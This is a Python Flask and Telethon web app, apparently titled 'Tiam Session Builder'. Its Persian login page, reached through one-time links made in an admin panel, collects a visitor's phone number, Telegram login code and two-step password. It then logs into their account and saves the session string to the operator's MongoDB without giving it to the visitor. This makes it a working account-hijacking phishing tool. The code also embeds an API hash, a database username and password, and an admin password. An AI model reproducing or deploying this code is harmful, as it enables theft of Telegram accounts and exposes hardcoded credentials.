# ================================================================
# Telegram Session Builder with Admin Panel + MongoDB + One-Time Links
# Flask + Telethon + Async Loop + Auto Keep-Alive
# By: Tiam
# ================================================================

import os
import threading
import asyncio
import secrets
import time
from flask import Flask, request, jsonify, send_from_directory, render_template_string, redirect
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from telethon.sessions import StringSession
from pymongo import MongoClient
from datetime import datetime

# ================================================================
# --- Global self_config -----------------------------------------
# ================================================================

self_config = {
    "app_title": "Tiam Session Builder",
    "app_theme": "galaxy_dark",
    "api_id": 24645053,
    "api_hash": "88c0167b74a24fac0a85c26c1f6d1991",
    "admin_username": "admin",
    "admin_password": "tiam_khorshid",
}

# ================================================================
# --- MongoDB Setup ----------------------------------------------
# ================================================================

mongo_uri = (
    "mongodb://strawhatmusicdb_db_user:db_strawhatmusic@"
    "ac-hw2zgfj-shard-00-00.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-01.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-02.morh5s8.mongodb.net:27017/"
    "?replicaSet=atlas-7m1dmi-shard-0&ssl=true&authSource=admin"
)

mongo_client = MongoClient(mongo_uri)
db = mongo_client["telegram_sessions"]
sessions_col = db["sessions"]
links_col = db["links"]

# ================================================================
# --- Flask Setup -----------------------------------------------
# ================================================================

app = Flask(__name__)

# ================================================================
# --- Async Loop Manager -----------------------------------------
# ================================================================

class LoopThread(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.loop = asyncio.new_event_loop()

    def run(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()

async_loop_thread = LoopThread()
async_loop_thread.start()

def run_async(coro):
    future = asyncio.run_coroutine_threadsafe(coro, async_loop_thread.loop)
    return future.result()

# ================================================================
# --- HTML Templates ---------------------------------------------
# ================================================================

HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>self_login</title>
<style>
body { margin:0;font-family:tahoma;color:white;overflow:hidden;height:100vh;width:100vw; }
#galaxy { position:fixed;top:0;left:0;width:100%;height:100%; background:url('https://cdn.pixabay.com/photo/2016/10/23/15/06/astronomy-1867616_1280.jpg') no-repeat center center fixed; background-size:cover; opacity:25; z-index:-1; }
#container { position:absolute;top:45%;left:50%;transform:translate(-50%, -50%);width:380px;padding:25px 20px;background:rgba(0,0,0,0.55);border-radius:20px;border:1px solid rgba(255,255,255,0.15);text-align:center;}
input { width:90%; padding:12px;margin-top:12px;border-radius:10px;border:none;outline:none;font-size:18px;}
button { width:94%; padding:13px;margin-top:15px;background:#5e5ef7;border:none;border-radius:10px;font-size:20px;color:white;cursor:pointer;}
h2 { margin-top:0; }
</style>
</head>
<body>
<div id="galaxy"></div>
<div id="container">
<h2>ساخت سشن تلگرام</h2>
<div id="step1">
<input id="phone" type="text" placeholder="شماره موبایل"/>
<button onclick="sendPhone()">ارسال کد</button>
</div>
<div id="step2" style="display:none;">
<input id="code" type="text" placeholder="کد OTP"/>
<button onclick="sendCode()">تأیید</button>
</div>
<div id="step3" style="display:none;">
<input id="password" type="password" placeholder="رمز دو مرحله‌ای"/>
<button onclick="sendPassword()">تأیید</button>
</div>
<div id="result" style="display:none;">
<h3>سشن ساخته شد</h3>
<p id="msg"></p>
</div>
</div>
<script>
let phone_global = "";
function sendPhone() {
    const phone = document.getElementById("phone").value.trim();
    phone_global = phone;
    fetch("/send_phone", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({phone:phone}) })
    .then(r=>r.json()).then(data=>{
        alert(data.message);
        if(data.status==="ok"){document.getElementById("step1").style.display="none";document.getElementById("step2").style.display="block";}
    });
}
function sendCode() {
    const code = document.getElementById("code").value.trim();
    fetch("/send_code", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({phone:phone_global,code:code}) })
    .then(r=>r.json()).then(data=>{
        if(data.status==="2fa"){document.getElementById("step2").style.display="none";document.getElementById("step3").style.display="block";}
        else if(data.status==="ok"){success(data.session_name);}
        else{alert(data.message);}
    });
}
function sendPassword() {
    const pass = document.getElementById("password").value.trim();
    fetch("/send_password", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({phone:phone_global,password:pass}) })
    .then(r=>r.json()).then(data=>{
        if(data.status==="ok"){success(data.session_name);}
        else{alert(data.message);}
    });
}
function success(name) {
    document.getElementById("step1").style.display="none";
    document.getElementById("step2").style.display="none";
    document.getElementById("step3").style.display="none";
    document.getElementById("result").style.display="block";
    document.getElementById("msg").innerText="سشن با موفقیت ساخته شد";
}
// Keep-alive every 4 minutes
setInterval(()=>{ fetch("/ping").catch(()=>{}); }, 240000);
</script>
</body>
</html>
"""

# ================================================================
# --- Client Manager ---------------------------------------------
# ================================================================

clients = {}

async def create_client(phone):
    client = TelegramClient(
        StringSession(),
        self_config["api_id"],
        self_config["api_hash"],
        device_model="⦁ 𝑺𝒆𝒍𝒇 𝑵𝒊𝒙",
        system_version=".",
        app_version="10.5",
        lang_code="fa",
        system_lang_code="fa"
    )
    await client.connect()
    return client

# ================================================================
# --- Utility Functions ------------------------------------------
# ================================================================

def generate_token(length=12):
    return secrets.token_urlsafe(length)

def check_link(token):
    link = links_col.find_one({"token": token, "active": True})
    if link and link["used_count"] < link["max_uses"]:
        return True
    return False

def increment_link(token):
    links_col.update_one({"token": token}, {"$inc": {"used_count": 1}})
    link = links_col.find_one({"token": token})
    if link["used_count"] >= link["max_uses"]:
        links_col.update_one({"token": token}, {"$set": {"active": False}})

# ================================================================
# --- Flask Routes -----------------------------------------------
# ================================================================

@app.route("/")
def home():
    token = request.args.get("key")
    if not token or not check_link(token):
        return "<h2>دسترسی معتبر نیست یا ظرفیت لینک تمام شده است</h2>"
    increment_link(token)
    return render_template_string(HTML_PAGE)

@app.route("/ping")
def ping():
    return "OK"

# ---------------- ADMIN PANEL -----------------------------------

@app.route("/admin", methods=["GET", "POST"])
def admin_panel():
    auth = request.authorization
    if not auth or auth.username != self_config["admin_username"] or auth.password != self_config["admin_password"]:
        return ("Unauthorized", 401, {"WWW-Authenticate": 'Basic realm="Login Required"'})
    # GET: show panel
    if request.method=="GET":
        links = list(links_col.find())
        html = "<h2>پنل ادمین</h2><form method='POST'>تعداد استفاده: <input name='max_uses' type='number' value='1'/><button type='submit'>ساخت لینک جدید</button></form><br>"
        html += "<table border=1><tr><th>لینک</th><th>استفاده شده</th><th>حداکثر</th><th>وضعیت</th></tr>"
        for l in links:
            html += f"<tr><td>?key={l['token']}</td><td>{l['used_count']}</td><td>{l['max_uses']}</td><td>{'فعال' if l['active'] else 'تمام'}</td></tr>"
        html += "</table>"
        return html
    # POST: create new link
    max_uses = int(request.form.get("max_uses",1))
    token = generate_token()
    links_col.insert_one({"token":token,"max_uses":max_uses,"used_count":0,"active":True,"created_at":datetime.utcnow()})
    return redirect("/admin")

# ---------------- TELETHON ENDPOINTS ----------------------------

@app.route("/send_phone", methods=["POST"])
def send_phone():
    data = request.json
    phone = data["phone"]
    try:
        def task():
            async def inner():
                client = await create_client(phone)
                clients[phone] = client
                sent = await client.send_code_request(phone)
                return True
            return run_async(inner())
        task()
        return jsonify({"status":"ok","message":"کد ارسال شد"})
    except Exception as e:
        return jsonify({"status":"error","message":str(e)})

@app.route("/send_code", methods=["POST"])
def send_code():
    data = request.json
    phone = data["phone"]
    code = data["code"]
    client = clients.get(phone)
    if not client:
        return jsonify({"status":"error","message":"کلاینت یافت نشد"})
    try:
        def task():
            async def inner():
                try:
                    await client.sign_in(phone, code)
                    session_str = client.session.save()
                    sessions_col.insert_one({"phone":phone,"session_string":session_str,"created_at":datetime.utcnow()})
                    return ("ok", phone)
                except SessionPasswordNeededError:
                    return ("2fa", None)
                except PhoneCodeInvalidError:
                    return ("invalid", None)
            return run_async(inner())
        status, session_name = task()
        if status=="invalid": return jsonify({"status":"error","message":"کد اشتباه است"})
        if status=="2fa": return jsonify({"status":"2fa","message":"رمز دو مرحله‌ای لازم است"})
        return jsonify({"status":"ok","session_name":session_name})
    except Exception as e:
        return jsonify({"status":"error","message":str(e)})

@app.route("/send_password", methods=["POST"])
def send_password():
    data = request.json
    phone = data["phone"]
    password = data["password"]
    client = clients.get(phone)
    if not client:
        return jsonify({"status":"error","message":"کلاینت یافت نشد"})
    try:
        def task():
            async def inner():
                await client.sign_in(password=password)
                session_str = client.session.save()
                sessions_col.insert_one({"phone":phone,"session_string":session_str,"created_at":datetime.utcnow()})
                return phone
            return run_async(inner())
        session_name = task()
        return jsonify({"status":"ok","session_name":session_name})
    except Exception as e:
        return jsonify({"status":"error","message":str(e)})

# ================================================================
# --- Run App -----------------------------------------------------
# ================================================================

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=False)
